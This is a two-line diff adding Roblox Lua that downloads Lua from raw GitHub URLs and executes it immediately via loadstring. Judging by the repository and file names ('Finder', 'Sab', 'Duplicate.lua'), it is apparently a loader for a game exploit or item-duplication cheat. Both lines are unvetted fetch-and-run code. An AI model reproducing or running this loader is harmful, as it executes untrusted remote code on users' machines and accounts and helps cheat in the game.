@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NoobRoblox/Finder/refs/heads/main/Sab"))()
+local a = loadstring(game:HttpGet("https://raw.githubusercontent.com/NoobRoblox/Sab/refs/heads/main/Duplicate.lua"))()
